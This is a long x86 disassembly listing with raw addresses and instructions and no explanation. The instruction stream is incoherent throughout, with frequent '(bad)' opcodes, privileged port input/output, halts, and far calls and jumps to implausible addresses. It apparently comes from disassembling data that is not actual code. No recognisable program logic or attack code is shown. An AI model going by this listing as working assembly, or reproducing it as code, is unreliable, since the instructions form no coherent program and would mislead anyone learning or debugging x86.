  415e5a:	retf   
  415e5b:	fnstenv [ebp+0x32]
  415e5e:	dec    esp
  415e5f:	jl     0x415ea3
  415e61:	popa   
  415e62:	push   eax
  415e63:	nop
  415e64:	mov    ebp,0x521bc7e0
  415e69:	js     0x415e01
  415e6b:	or     BYTE PTR [edx],dl
  415e6d:	ins    DWORD PTR es:[edi],dx
  415e6e:	mov    al,0x3e
  415e70:	nop
  415e71:	mov    eax,ds:0x753b6445
  415e76:	cdq    
  415e77:	dec    ecx
  415e78:	daa    
  415e79:	or     ecx,DWORD PTR [ecx]
  415e7b:	and    al,0x50
  415e7e:	jae    0x415e1c
  415e80:	cs dec ebp
  415e82:	ret    
  415e83:	test   DWORD PTR [esi],edi
  415e85:	add    al,0x5c
  415e87:	or     BYTE PTR [edx-0x23],cl
  415e8a:	add    BYTE PTR [eax-0x56eaa3a2],dh
  415e90:	arpl   bp,di
  415e92:	inc    esp
  415e93:	sub    BYTE PTR [ebx+0x40],ah
  415e96:	pop    ebx
  415e97:	push   cs
  415e98:	push   esp
  415e99:	push   cs
  415e9a:	xchg   BYTE PTR [edi-0x57],dl
  415e9d:	nop
  415e9e:	scas   eax,DWORD PTR es:[edi]
  415e9f:	jbe    0x415e26
  415ea1:	jge    0x415e6f
  415ea3:	ret    
  415ea4:	hlt    
  415ea5:	divps  xmm4,XMMWORD PTR [edi+0x3a]
  415ea9:	mov    BYTE PTR [esi+0x3cdcf037],bl
  415eaf:	push   ebp
  415eb0:	mov    ecx,0x670de229
  415eb5:	cmp    edx,edi
  415eb7:	add    ebp,0x18b5838
  415ebd:	dec    edx
  415ebe:	cmp    eax,0x331fee2
  415ec3:	mov    ds:0x565d5a80,eax
  415ec8:	out    dx,al
  415ec9:	mov    eax,0xe64061b2
  415ece:	hlt    
  415ecf:	mov    ch,0xf9
  415ed1:	jg     0x415e75
  415ed3:	dec    esi
  415ed4:	ins    BYTE PTR es:[edi],dx
  415ed5:	outs   dx,BYTE PTR ds:[esi]
  415ed6:	out    0x39,eax
  415ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed9:	xchg   BYTE PTR [ecx],dh
  415edb:	scas   al,BYTE PTR es:[edi]
  415edc:	lods   eax,DWORD PTR ds:[esi]
  415edd:	aas    
  415ede:	bound  ecx,QWORD PTR [ebp-0x6e1d7459]
  415ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee5:	adc    BYTE PTR [ecx-0x13c4c521],bl
  415eeb:	add    DWORD PTR [edi+edx*1-0x61],esi
  415eef:	add    bl,bl
  415ef1:	jne    0x415f4b
  415ef3:	aad    0xab
  415ef5:	inc    ebp
  415ef6:	aam    0x36
  415ef8:	sbb    BYTE PTR [esi+eax*8],ch
  415efb:	mov    esi,0x5cc3480e
  415f00:	or     dh,BYTE PTR [esi-0x1]
  415f03:	addr16 jbe 0x415f6d
  415f06:	add    esi,DWORD PTR [ebp+0x4a]
  415f09:	shr    BYTE PTR [ebp-0x622f54c6],cl
  415f0f:	inc    ebp
  415f10:	jmp    0x22ded4ba
  415f15:	cld    
  415f16:	xor    BYTE PTR [edi+0xe4f23c2],dh
  415f1c:	mov    esi,0xc51ef9dd
  415f21:	iret   
  415f22:	lods   al,BYTE PTR ds:[esi]
  415f23:	xchg   esp,eax
  415f24:	das    
  415f25:	dec    ecx
  415f26:	mov    al,ds:0x36ee6315
  415f2b:	call   0x41ca:0x52155d39
  415f32:	sub    ebp,eax
  415f34:	call   0x4d7d:0xd93a08c8
  415f3b:	sbb    BYTE PTR [esi+ebx*1+0x58d879e8],dl
  415f42:	test   al,0xcb
  415f44:	xchg   ebp,eax
  415f45:	sbb    BYTE PTR [ecx],ch
  415f47:	add    esp,ebx
  415f49:	xchg   ebx,eax
  415f4a:	pusha  
  415f4b:	and    BYTE PTR [ebx+0x3b],al
  415f4e:	retf   
  415f4f:	xchg   ebp,eax
  415f50:	push   esi
  415f51:	enter  0x33ff,0x37
  415f55:	jp     0x415f7e
  415f57:	sub    eax,0xf26b9602
  415f5c:	add    eax,0xa01162d6
  415f61:	jb     0x415ee6
  415f63:	push   esp
  415f64:	ds push 0xffffffd1
  415f67:	repnz mov esp,0x64380d14
  415f6d:	icebp  
  415f6e:	repz fimul WORD PTR [edx+eiz*2-0x38]
  415f73:	std    
  415f74:	out    dx,al
  415f75:	lea    edx,[ebp-0x9]
  415f78:	pop    esi
  415f79:	loope  0x415f99
  415f7b:	ins    DWORD PTR es:[edi],dx
  415f7c:	xor    dh,BYTE PTR [ebx+edx*1-0x6666552b]
  415f83:	push   esi
  415f84:	cmp    BYTE PTR [ebx],cl
  415f86:	nop
  415f87:	mov    ch,0xcb
  415f89:	iret   
  415f8a:	(bad)  
  415f8b:	fsubrp st(5),st
  415f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8e:	aaa    
  415f8f:	pushf  
  415f90:	push   es
  415f91:	dec    ecx
  415f92:	cmc    
  415f93:	ins    BYTE PTR es:[edi],dx
  415f94:	sbb    BYTE PTR [edx+0x51],ch
  415f97:	xor    eax,ebx
  415f99:	sub    eax,0xcbd7ae6e
  415f9e:	ret    0xe240
  415fa1:	test   eax,0xc9d424af
  415fa6:	dec    edx
  415fa7:	jl     0x415f47
  415fa9:	int    0x3b
  415fab:	lea    ebx,[ecx+0x4443c90f]
  415fb1:	into   
  415fb2:	out    dx,eax
  415fb3:	fsubr  DWORD PTR [ebp+0x66335373]
  415fb9:	test   BYTE PTR [edx*2-0x170bc7ea],dh
  415fc0:	aam    0xd5
  415fc2:	sar    BYTE PTR [esi],0x81
  415fc5:	or     dh,bh
  415fc7:	mov    cl,0x78
  415fc9:	add    dh,BYTE PTR es:[ebp+0x7bef280e]
  415fd0:	sub    DWORD PTR [edx-0xb],eax
  415fd3:	xor    DWORD PTR [ecx-0x314c82a],0xc25857a5
  415fdd:	xchg   ecx,ecx
  415fdf:	mov    cl,dh
  415fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe2:	in     eax,dx
  415fe3:	cld    
  415fe4:	xchg   bh,bl
  415fe6:	in     al,0x60
  415fe8:	and    ah,bl
  415fea:	mov    dh,0xca
  415fec:	in     eax,dx
  415fed:	xor    cl,al
  415fef:	int3   
  415ff0:	inc    eax
  415ff1:	rcl    ecx,1
  415ff3:	dec    eax
  415ff4:	int3   
  415ff5:	bound  ecx,QWORD PTR [esi-0x6e]
  415ff8:	push   ds
  415ff9:	repz push es
  415ffb:	add    ch,dl
  415ffd:	adc    ecx,esi
  415fff:	repz mov esi,0xca705383
  416005:	jp     0x416076
  416007:	mul    BYTE PTR [ebx+0x7a2d4c65]
  41600d:	cmp    dl,0x4b
  416010:	out    dx,al
  416011:	mov    ss,WORD PTR [ecx-0x4cefe6a1]
  416017:	pop    esi
  416018:	imul   edx,ecx,0xffffff98
  41601b:	jnp    0x41606d
  41601d:	add    BYTE PTR [ebx],cl
  41601f:	jle    0x41605a
  416021:	mov    dl,0x2f
  416023:	nop
  416024:	out    dx,eax
  416025:	sub    BYTE PTR [edx+0x6a],al
  416028:	xchg   esi,eax
  416029:	mov    edx,0xf2b83d9
  41602e:	and    al,0x3a
  416030:	cmp    esp,ecx
  416032:	mov    bh,0xed
  416034:	xchg   edi,eax
  416035:	mov    BYTE PTR [ecx+ebp*2+0x7d],al
  416039:	pop    ds
  41603a:	pop    DWORD PTR [edx]
  41603c:	rcl    bl,1
  41603e:	hlt    
  41603f:	call   0x6f28171c
  416044:	or     eax,0x3ef99fea
  416049:	addr16 jae 0x415fdc
  41604c:	jne    0x41607e
  41604e:	mov    dh,0x6a
  416050:	inc    ebx
  416051:	loope  0x4160bf
  416053:	and    dh,BYTE PTR [eax-0xb3b4469]
  416059:	lds    ebx,FWORD PTR [ebp+0x12]
  41605c:	jge    0x416092
  41605e:	inc    ebx
  41605f:	pop    ss
  416060:	and    esp,DWORD PTR [esi+ecx*4-0xf]
  416064:	pop    ds
  416065:	xchg   ebp,eax
  416066:	cld    
  416067:	call   0x8bf2:0xdbe6cf29
  41606e:	ss adc ecx,edx
  416071:	xchg   BYTE PTR [esi],ah
  416073:	sbb    DWORD PTR [edx+0xd],ebp
  416076:	pop    edi
  416077:	or     bl,BYTE PTR ds:0x9d1bae6b
  41607d:	loop   0x4160bb
  41607f:	mov    BYTE PTR [edi-0x67976fc4],ch
  416085:	mov    ch,0x98
  416087:	daa    
  416088:	in     eax,0x4c
  41608a:	pusha  
  41608b:	in     al,dx
  41608c:	inc    edx
  41608d:	(bad)  
  41608e:	push   eax
  41608f:	mov    ds:0xe640495e,al
  416094:	daa    
  416095:	and    bh,BYTE PTR [esi]
  416097:	pop    ds
  416098:	fild   QWORD PTR [ecx+ecx*4+0x1e5aa53e]
  41609f:	sub    al,0xb0
  4160a1:	sub    DWORD PTR [ecx],esp
  4160a3:	inc    ebx
  4160a4:	inc    ebp
  4160a5:	call   0x3ea9f8e5
  4160aa:	jnp    0x416129
  4160ac:	sub    edx,ebp
  4160ae:	fldenv ds:0xda9c8306
  4160b4:	retf   
  4160b5:	test   al,0x3d
  4160b7:	xor    eax,edi
  4160b9:	out    0xdd,eax
  4160bb:	xor    eax,0x26cf3717
  4160c0:	lock in al,dx
  4160c2:	loop   0x416107
  4160c4:	jae    0x416132
  4160c6:	rcl    BYTE PTR [esi-0xdece2f7],cl
  4160cc:	inc    esp
  4160cd:	iret   
  4160ce:	call   0x45c59d79
  4160d3:	es je  0x41613e
  4160d6:	mov    BYTE PTR [ebx-0x9],bh
  4160d9:	jmp    0xc893250b
  4160de:	fisttp WORD PTR [ebx+0x76]
  4160e1:	and    al,0xde
  4160e3:	mov    edx,0xc4fcfee2
  4160e8:	sahf   
  4160e9:	push   ecx
  4160ea:	pop    ss
  4160eb:	adc    eax,0x7e5fdacd
  4160f0:	ret    0x4adb
  4160f3:	mov    esi,0x3b6feebe
  4160f8:	sub    edx,DWORD PTR [esi]
  4160fa:	gs test al,0x25
  4160fd:	pop    edi
  4160fe:	dec    ecx
  4160ff:	push   ss
  416100:	ret    
  416101:	mul    BYTE PTR [ecx-0x21b2ac6]
  416107:	outs   dx,DWORD PTR ds:[esi]
  416108:	imul   ebp
  41610a:	and    eax,0xa4fee351
  41610f:	fsubrp st(0),st
  416111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416112:	addr16 inc ecx
  416114:	outs   dx,BYTE PTR ds:[esi]
  416115:	pop    eax
  416116:	sub    DWORD PTR [ebp-0x616ab962],0x609c90ff
  416120:	or     ebx,ebp
  416122:	jl     0x416171
  416124:	mov    ds:0xfe9f08cc,eax
  416129:	pop    ebx
  41612a:	int3   
  41612b:	and    BYTE PTR [esi],bl
  41612d:	cwde   
  41612e:	dec    ecx
  41612f:	sbb    BYTE PTR ss:[esi+0x479517a1],dl
  416136:	jmp    0x416121
  416138:	sar    BYTE PTR [ebx+0x7c61d1cc],0x64
  41613f:	dec    esp
  416140:	mov    ds:0x7d0cc7b3,al
  416145:	test   al,0x8f
  416147:	pop    edx
  416148:	sub    ebp,esi
  41614a:	xchg   ebp,eax
  41614b:	(bad)
  41614f:	scas   al,BYTE PTR es:[edi]
  416150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416151:	dec    ebp
  416152:	sbb    edx,eax
  416154:	ret    
  416155:	jg     0x4161c0
  416157:	ins    DWORD PTR es:[edi],dx
  416158:	ja     0x416177
  41615a:	and    edi,DWORD PTR [edi+0x1e]
  41615d:	mov    ch,0x20
  41615f:	or     ch,BYTE PTR [edx+0x70]
  416162:	das    
  416163:	daa    
  416164:	adc    al,0x7c
  416166:	push   eax
  416167:	mov    bl,0x13
  416169:	jmp    0x7bfa79d1
  41616e:	add    eax,0x5ae02f8c
  416173:	fstp   DWORD PTR gs:[ecx+eiz*4-0x2e]
  416178:	mov    cs,WORD PTR [edi+0x1327a355]
  41617e:	out    0xec,eax
  416180:	fs test al,0x55
  416183:	cmp    ah,BYTE PTR [ebp+eiz*8+0x4c]
  416187:	into   
  416188:	mov    cl,0xa9
  41618a:	push   eax
  41618b:	popa   
  41618c:	loopne 0x4161ab
  41618e:	ret    
  41618f:	imul   ebx,DWORD PTR [esi-0x9],0x8bac161b
  416196:	aaa    
  416197:	fdiv   DWORD PTR [edx+0x3c]
  41619a:	push   esp
  41619b:	ja     0x416148
  41619d:	pop    eax
  41619e:	iret   
  41619f:	lock mov bh,0x47
  4161a2:	ret    
  4161a3:	out    0x9e,al
  4161a5:	sub    al,0x80
  4161a7:	test   dl,cl
  4161a9:	jne    0x4161a0
  4161ab:	dec    esp
  4161ac:	mov    ebp,0x8cde81b8
  4161b1:	mov    dh,0x9f
  4161b3:	mov    eax,0x316de2d8
  4161b8:	rol    DWORD PTR [edi+ecx*2-0x4a88bcc9],cl
  4161bf:	add    eax,0xb15f5199
  4161c4:	mov    edi,0xf6d7035c
  4161c9:	pop    ebp
  4161ca:	inc    edx
  4161cb:	xchg   edi,ebx
  4161cd:	neg    BYTE PTR [ebx-0x14]
  4161d0:	jge    0x416201
  4161d2:	retf   0x8d01
  4161d5:	add    BYTE PTR [ebp-0x3217c8c],bl
  4161db:	(bad)  
  4161dc:	pop    ecx
  4161dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161de:	pusha  
  4161df:	mov    bl,0x2b
  4161e1:	scas   al,BYTE PTR es:[edi]
  4161e2:	sbb    BYTE PTR [edx-0x26],0x32
  4161e6:	jmp    0xfc3e4dba
  4161eb:	mov    dh,BYTE PTR [eax]
  4161ed:	jle    0x41620e
  4161ef:	jno    0x4161de
  4161f1:	rcl    DWORD PTR [ebp+0x13e1ad2c],0xbd
  4161f8:	push   eax
  4161f9:	push   ebx
  4161fa:	scas   al,BYTE PTR es:[edi]
  4161fb:	out    dx,eax
  4161fc:	ja     0x416250
  4161fe:	mov    ch,0xc1
  416200:	mov    ebx,0xe081e9ae
  416205:	or     DWORD PTR [ebp+0x3d1c87f7],ebp
  41620b:	xor    eax,0x727ef49d
  416210:	pushf  
  416211:	daa    
  416212:	hlt    
  416213:	idiv   DWORD PTR [ecx-0x1b]
  416216:	std    
  416217:	test   BYTE PTR [edx+0x39],dl
  41621a:	dec    ebx
  41621b:	pop    ss
  41621c:	xchg   esp,ecx
  41621e:	push   ds
  41621f:	add    eax,0xdc7e71cf
  416224:	cmp    eax,DWORD PTR [esi+0x1d]
  416227:	ret    0x9b7a
  41622a:	hlt    
  41622b:	cdq    
  41622c:	out    dx,al
  41622d:	dec    ecx
  41622e:	iret   
  41622f:	nop
  416230:	popf   
  416231:	je     0x416225
  416233:	xor    bh,dl
  416235:	les    ecx,FWORD PTR gs:[ebp+0x40]
  416239:	and    ecx,ebx
  41623b:	(bad)  
  41623c:	in     eax,dx
  41623d:	inc    eax
  41623e:	in     eax,0xfe
  416240:	ss sti 
  416242:	and    BYTE PTR [edi+0xb],bl
  416245:	sbb    esi,eax
  416247:	fimul  WORD PTR [ebx+0x60]
  41624a:	mov    cl,0x1f
  41624c:	aas    
  41624d:	in     al,dx
  41624e:	or     BYTE PTR ds:0x91bc157e,ch
  416254:	loope  0x416219
  416256:	jge    0x4161f1
  416258:	jnp    0x4162c3
  41625a:	and    eax,0x11433cff
  41625f:	test   edi,eax
  416261:	sub    dh,BYTE PTR [ebp-0x6e]
  416264:	pop    edx
  416265:	mov    ds,WORD PTR [edx]
  416267:	imul   edi,ebp,0xffffffc1
  41626a:	xor    al,dl
  41626c:	cwde   
  41626d:	cmp    eax,ebp
  41626f:	popw   es
  416271:	pop    ecx
  416272:	shl    BYTE PTR [esp+edx*8+0x1b],cl
  416276:	jnp    0x416247
  416278:	dec    esi
  416279:	test   eax,0xd18079a4
  41627e:	call   0x60f62231
  416283:	inc    ebp
  416284:	pop    ebx
  416285:	call   0xbfc3:0xe0c2a80
  41628c:	loop   0x416247
  41628e:	and    ecx,DWORD PTR [ecx-0x1163188d]
  416294:	stc    
  416295:	lods   eax,DWORD PTR ds:[esi]
  416296:	jb     0x4162fd
  416298:	out    0x62,al
  41629a:	imul   ebx,ecx,0xffffffd0
  41629d:	xchg   ecx,eax
  41629e:	sub    eax,0x616c0d58
  4162a3:	pop    ecx
  4162a4:	adc    eax,0xb75b2210
  4162a9:	sub    ecx,0x1d
  4162ac:	rcl    BYTE PTR [eax],0x36
  4162af:	mov    ecx,0x2b038149
  4162b4:	mov    bl,0x75
  4162b6:	sub    eax,0x2bdf5b6d
  4162bb:	setae  BYTE PTR [ebx-0x35]
  4162bf:	mov    eax,ds:0x97a83487
  4162c4:	iret   
  4162c5:	enter  0xe0e8,0xbe
  4162c9:	add    DWORD PTR [edx],ebx
  4162cb:	test   eax,0xe2874991
  4162d0:	cmc    
  4162d1:	push   ds
  4162d2:	enter  0x4107,0x65
  4162d6:	call   0xf8f:0xfe4753cf
  4162dd:	icebp  
  4162de:	push   ds
  4162df:	cwde   
  4162e0:	mov    edi,0xc87c3482
  4162e5:	jge    0x416347
  4162e7:	lea    ecx,[ecx+0x242715f4]
  4162ed:	outs   dx,DWORD PTR ds:[esi]
  4162ee:	or     al,0x9
  4162f0:	mov    eax,ds:0x148a4104
  4162f5:	(bad)  
  4162f6:	test   eax,0xa9782251
  4162fb:	sahf   
  4162fc:	mov    eax,0xdd3efee3
  416301:	retf   0x8ebf
  416304:	or     DWORD PTR ds:0x972d7178,eax
  41630a:	and    esp,DWORD PTR [eax-0x1d27e555]
  416310:	daa    
  416311:	inc    esp
  416312:	in     eax,0xb6
  416314:	cmp    eax,0x849b007e
  416319:	pop    es
  41631a:	push   ecx
  41631b:	dec    edx
  41631c:	out    dx,eax
  41631d:	popa   
  41631e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41631f:	mov    ch,0xd0
  416321:	retf   0x9b06
  416324:	fadd   QWORD PTR [edi+0x8598c2]
  41632a:	ucomisd xmm7,QWORD PTR [eax]
  41632e:	out    dx,al
  41632f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416330:	cmp    DWORD PTR es:[ecx+ecx*8+0x526822c6],esi
  416338:	imul   ecx,esp,0x98fe5605
  41633e:	mov    BYTE PTR [edx+ebx*8],al
  416341:	inc    esp
  416342:	popf   
  416343:	push   0xffffffa5
  416345:	ret    
  416346:	leave  
  416347:	imul   BYTE PTR [ebx+esi*4+0x6bc727f5]
  41634e:	stc    
  41634f:	cmp    esp,DWORD PTR [eax-0x2b]
  416352:	(bad)  
  416353:	jg     0x416300
  416355:	dec    edx
  416356:	pop    ss
  416357:	fistp  WORD PTR [ebx-0x1e]
  41635a:	xchg   DWORD PTR [ebx+esi*8],esp
  41635d:	mov    ch,0x2d
  41635f:	out    dx,eax
  416360:	stc    
  416361:	sbb    al,0x4c
  416363:	pop    ebx
  416364:	mov    al,0x98
  416366:	push   edx
  416367:	mov    DWORD PTR [eax+0x45099f2d],edi
  41636d:	dec    edx
  41636e:	push   ebx
  41636f:	in     eax,dx
  416370:	pop    edx
  416371:	cwde   
  416372:	push   ds
  416373:	add    al,0x32
  416375:	nop
  416376:	sub    al,0x50
  416378:	mov    eax,ds:0xdd74fe3d
  41637d:	jp     0x41632b
  41637f:	out    0x57,al
  416381:	pushf  
  416382:	xchg   ebp,eax
  416383:	pop    edi
  416384:	jbe    0x41637b
  416386:	push   ecx
  416387:	or     al,0x6a
  416389:	mov    al,0x6
  41638b:	push   edx
  41638c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41638d:	aas    
  41638e:	and    al,0x40
  416390:	sub    eax,0x5102c8bb
  416395:	inc    ebp
  416396:	ins    BYTE PTR es:[edi],dx
  416397:	sbb    eax,0x8994b500
  41639c:	neg    DWORD PTR [eax+0x7]
  41639f:	scas   eax,DWORD PTR es:[edi]
  4163a0:	xchg   ebx,eax
  4163a1:	and    al,0xd2
  4163a3:	mov    eax,ds:0x930f5fcd
  4163a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a9:	push   ebx
  4163aa:	fsubrp st(6),st
  4163ac:	call   0x407b:0x55d7280c
  4163b3:	mov    bl,0x5d
  4163b5:	mov    ds:0xa039a51,al
  4163ba:	or     al,0x5d
  4163bc:	dec    edi
  4163bd:	cmova  esi,DWORD PTR [eax-0x780cb4df]
  4163c4:	in     eax,dx
  4163c5:	sbb    cl,BYTE PTR [edx]
  4163c7:	out    0x69,al
  4163c9:	push   edx
  4163ca:	sbb    eax,0xbc89ff15
  4163cf:	cmp    BYTE PTR [esi],0x1c
  4163d2:	add    al,0xcc
  4163d4:	test   esi,esp
  4163d6:	xchg   ah,cl
  4163d8:	in     al,0xc3
  4163da:	mov    ch,0xe8
  4163dc:	int3   
  4163dd:	lock push 0x6b
  4163e0:	mov    eax,0xb57746ee
  4163e5:	test   BYTE PTR [eax-0x6d],bh
  4163e8:	dec    esi
  4163e9:	pop    edi
  4163ea:	push   ebx
  4163eb:	cmp    al,0xcc
  4163ed:	ins    DWORD PTR es:[edi],dx
  4163ee:	jle    0x41638f
  4163f0:	(bad)  
  4163f1:	in     eax,dx
  4163f2:	cmp    edx,edi
  4163f4:	jmp    0x4163c3
  4163f6:	push   DWORD PTR [ebp-0x44]
  4163f9:	int3   
  4163fa:	inc    esp
  4163fb:	int3   
  4163fc:	(bad)  
  4163fd:	arpl   WORD PTR cs:[ebx],bp
  416400:	ja     0x416477
  416402:	in     al,0x76
  416404:	pop    ecx
  416405:	leave  
  416406:	stos   BYTE PTR es:[edi],al
  416407:	test   DWORD PTR [esi-0x2d],esi
  41640a:	imul   edx,DWORD PTR [ebx+0x53],0xffffff82
  41640e:	jae    0x416405
  416410:	mov    ah,0x50
  416412:	repnz fstp QWORD PTR [ebx]
  416415:	in     eax,0x87
  416417:	mov    dh,0x24
  416419:	pop    ebp
  41641a:	scas   eax,DWORD PTR es:[edi]
  41641b:	bnd jns 0x416402
  41641e:	ret    
  41641f:	or     eax,0xaeb22bd8
  416424:	mov    eax,ds:0x32c97dca
  416429:	ins    DWORD PTR es:[edi],dx
  41642a:	add    cl,BYTE PTR [eax]
  41642c:	add    DWORD PTR [ecx],ebx
  41642e:	pop    edx
  41642f:	sahf   
  416430:	adc    BYTE PTR ds:0xa1c582f0,ch
  416436:	js     0x416474
  416438:	inc    eax
  416439:	fiadd  DWORD PTR [ebp+0x67d3c767]
  41643f:	bound  esi,QWORD PTR [esp+eiz*4+0x77e6a044]
  416446:	cmc    
  416447:	(bad)  
  416449:	fst    QWORD PTR [edx]
  41644b:	(bad)  
  41644c:	jmp    0x4705:0x9ac4835
  416453:	inc    ecx
  416454:	push   edi
  416455:	and    al,0x99
  416457:	stos   DWORD PTR es:[edi],eax
  416458:	jb     0x416443
  41645a:	push   ss
  41645b:	jle    0x4163ed
  41645d:	dec    edi
  41645e:	jge    0x416452
  416460:	clc    
  416461:	mov    eax,0x41466b2a
  416466:	xchg   DWORD PTR [ebp-0x21],ebx
  416469:	jle    0x41645b
  41646b:	dec    eax
  41646c:	or     al,0xa3
  41646e:	sar    BYTE PTR [edx],0xf3
  416471:	sub    DWORD PTR [eax+0x6d],eax
  416474:	ja     0x4164d5
  416476:	xchg   edi,eax
  416477:	daa    
  416478:	rol    BYTE PTR ds:0x98d8e4af,0x99
  41647f:	shl    BYTE PTR [eax+ebp*4-0x8],cl
  416483:	(bad)  [eax+0x54]
  416486:	and    cl,dl
  416488:	add    eax,0x30ac0bf2
  41648d:	cmp    DWORD PTR [ecx+0x72385816],0x260cd404
  416497:	jmp    0x43ab:0xc35ab9c6
  41649e:	loopne 0x4164d9
  4164a0:	add    BYTE PTR [eax+0x51],cl
  4164a3:	outs   dx,DWORD PTR ds:[esi]
  4164a4:	shl    esp,cl
  4164a6:	es out 0x23,al
  4164a9:	sbb    esi,DWORD PTR [ebp-0x12]
  4164ac:	jl     0x41646c
  4164ae:	pop    ebp
  4164af:	jne    0x41649b
  4164b1:	inc    eax
  4164b2:	adc    al,0xa3
  4164b4:	scas   al,BYTE PTR es:[edi]
  4164b5:	inc    ecx
  4164b6:	repz adc eax,0x77eeb4b0
  4164bc:	ror    BYTE PTR [edi+eax*1+0x7b],0x84
  4164c1:	push   ebx
  4164c2:	inc    ebp
  4164c3:	fstp   TBYTE PTR [eax-0x409f68b3]
  4164c9:	pop    esp
  4164ca:	in     al,dx
  4164cb:	push   0xffffffc3
  4164cd:	repz adc bl,BYTE PTR [esi]
  4164d0:	sar    BYTE PTR [edx-0x37418f35],cl
  4164d6:	pop    eax
  4164d7:	hlt    
  4164d8:	fnstsw WORD PTR [edx+0x58ff2036]
  4164de:	test   eax,0x59dc9b44
  4164e3:	and    eax,ebx
  4164e5:	shl    DWORD PTR [edx+0x1b],0xd3
  4164e9:	mov    esp,0xc97a361d
  4164ee:	add    BYTE PTR [ebp-0x1c],bl
  4164f1:	mov    edx,0x461c384d
  4164f6:	fisubr WORD PTR [ebx+0x38]
  4164f9:	das    
  4164fa:	or     BYTE PTR [ecx+eax*2-0xc],cl
  4164fe:	inc    eax
  4164ff:	jmp    0xb5fb89ac
  416504:	cdq    
  416505:	pop    ecx
  416506:	jae    0x416573
  416508:	lds    esp,FWORD PTR [ebx]
  41650a:	mov    eax,ds:0x335f1d5a
  41650f:	xchg   esi,eax
  416510:	out    dx,eax
  416511:	mov    BYTE PTR [ebp-0x7d],0xee
  416515:	jbe    0x4164d9
  416517:	or     DWORD PTR [ebx],esp
  416519:	fstp   DWORD PTR [ebx-0x21]
  41651c:	lods   al,BYTE PTR ds:[esi]
  41651d:	cld    
  41651e:	xor    DWORD PTR [eax+0x75fc9a0a],0xffffffc1
  416525:	xchg   DWORD PTR [edi+0x2dadbbde],esp
  41652b:	aad    0x1
  41652d:	adc    BYTE PTR [ecx-0x54],dl
  416530:	sub    cl,0xc4
  416533:	ins    DWORD PTR es:[edi],dx
  416534:	pop    esi
  416535:	js     0x416542
  416537:	retf   0xb020
  41653a:	ror    BYTE PTR [edi+edx*8],0xc8
  41653e:	sbb    al,0x5d
  416540:	inc    ebp
  416541:	leave  
  416542:	mov    ah,0xd1
  416544:	and    eax,0xaa214a92
  416549:	push   cs
  41654a:	xchg   DWORD PTR [eax-0x61],eax
  41654d:	mov    bh,0xdc
  41654f:	loopne 0x4164ea
  416551:	cmp    al,0xeb
  416553:	mov    ch,0x34
  416555:	jne    0x416517
  416557:	fsubr  DWORD PTR [eax]
  416559:	jl     0x41652d
  41655b:	sub    eax,0xc3c3a2e5
  416560:	shr    DWORD PTR ds:0x89dd49e7,cl
  416566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416567:	cmp    DWORD PTR ds:0x918231ed,ecx
  41656d:	jle    0x416581
  41656f:	and    al,0x1b
  416571:	ret    0x995
  416574:	adc    DWORD PTR [edx-0x62],edx
  416577:	add    edi,DWORD PTR [eax-0x13]
  41657a:	rol    BYTE PTR [ecx-0x59],0x8b
  41657e:	fwait
  41657f:	jle    0x41659a
  416581:	aam    0x2a
  416583:	leave  
  416584:	je     0x41653b
  416586:	scas   eax,DWORD PTR es:[edi]
  416587:	sub    DWORD PTR [edi],ebp
  416589:	loop   0x4165b7
  41658b:	int3   
  41658c:	sbb    edi,DWORD PTR [ebx]
  41658e:	clc    
  41658f:	arpl   ax,si
  416591:	arpl   WORD PTR [ecx-0x22],bp
  416594:	daa    
  416595:	mov    al,BYTE PTR [ecx]
  416597:	jmp    0xd2b3:0x272939bb
  41659e:	mov    esi,0x65cc38e3
  4165a3:	ins    DWORD PTR es:[edi],dx
  4165a4:	jno    0x416593
  4165a6:	pusha  
  4165a7:	aas    
  4165a8:	in     al,0x62
  4165aa:	fsubrp st(4),st
  4165ac:	and    DWORD PTR [eax-0x39],0x70e20609
  4165b3:	jb     0x416558
  4165b5:	pop    esp
  4165b6:	shl    DWORD PTR [ebx],cl
  4165b8:	dec    ebx
  4165b9:	cmp    BYTE PTR [ebp+0x52d0edc2],dh
  4165bf:	int    0x81
  4165c1:	jecxz  0x416613
  4165c3:	xor    BYTE PTR [eax-0x7b3fba5a],ah
  4165c9:	in     al,0x72
  4165cb:	mov    ch,0x6f
  4165cd:	ret    
  4165ce:	inc    eax
  4165cf:	xchg   DWORD PTR [ebx+esi*2],ebp
  4165d2:	mov    ds:0x33cec81f,al
  4165d7:	cwde   
  4165d8:	mov    WORD PTR [esi+edi*1],?
  4165db:	inc    eax
  4165dc:	enter  0x3e37,0x31
  4165e0:	or     edx,DWORD PTR [esi]
  4165e2:	test   al,0xb2
  4165e4:	xor    bl,bh
  4165e6:	or     DWORD PTR [edi-0x62bbb687],esi
  4165ec:	popf   
  4165ed:	into   
  4165ee:	sbb    esi,DWORD PTR [di+0x3]
  4165f2:	into   
  4165f3:	mov    ecx,0xc12318cf
  4165f8:	push   es
  4165f9:	imul   ecx,DWORD PTR [ebx+0x3],0xb
  4165fd:	loop   0x416661
  4165ff:	sbb    edx,edx
  416601:	push   0x684874d0
  416606:	adc    BYTE PTR [edi+0x62a85d45],0x78
  41660d:	ja     0x416641
  41660f:	sbb    al,0x75
  416611:	pop    edi
  416612:	pmaxsw mm1,QWORD PTR [ebp+0x7aa7d144]
  416619:	lods   al,BYTE PTR ds:[esi]
  41661a:	out    dx,al
  41661b:	and    bh,BYTE PTR [edi+eiz*4+0x1e68dbac]
  416622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416623:	loopne 0x416606
  416625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416626:	sets   BYTE PTR [ecx-0x4c11ceda]
  41662d:	leave  
  41662e:	dec    edi
  41662f:	loop   0x41660b
  416631:	xor    eax,0x5d50f4c8
  416636:	ret    0xf6be
  416639:	push   cs
  41663a:	sbb    dh,ch
